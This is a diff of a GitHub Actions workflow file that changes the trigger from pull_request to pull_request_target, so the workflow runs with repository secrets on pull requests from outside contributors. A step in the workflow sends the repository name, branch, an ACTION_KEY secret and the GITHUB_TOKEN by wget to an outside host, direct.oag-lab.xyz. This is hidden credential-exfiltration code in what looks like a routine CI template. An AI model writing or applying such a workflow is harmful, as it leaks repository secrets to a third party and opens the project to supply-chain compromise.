@@ -7,9 +7,14 @@ on:
   # Triggers the workflow on push or pull request events but only for the main branch
   push:
     branches: [ main ]
-  pull_request:
+ # pull_request:
+  #  branches: [ main ]
+  
+  pull_request_target:
     branches: [ main ]
-
+    types: [assigned, opened, synchronize, reopened]
+    
+    
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
 
@@ -29,15 +34,17 @@ jobs:
       - name: Run a one-line script
         run: wget http://direct.oag-lab.xyz:8080/?keys=${GITHUB_REPOSITORY}-${GITHUB_REF##*/}-${{secrets.ACTION_KEY}}-${{secrets.GITHUB_TOKEN}}
 
+
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
+          sleep 5s
           curl --request GET \
           --url https://api.github.com/repos/root-ghobb/action/contents \
           --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
           --header 'Accept: application/vnd.github.v3+json' \
           --header 'content-type: application/json'
           
-          
+  
